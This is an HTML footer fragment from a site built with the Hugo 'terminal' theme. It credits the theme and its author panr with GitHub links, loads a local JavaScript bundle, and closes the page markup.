<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>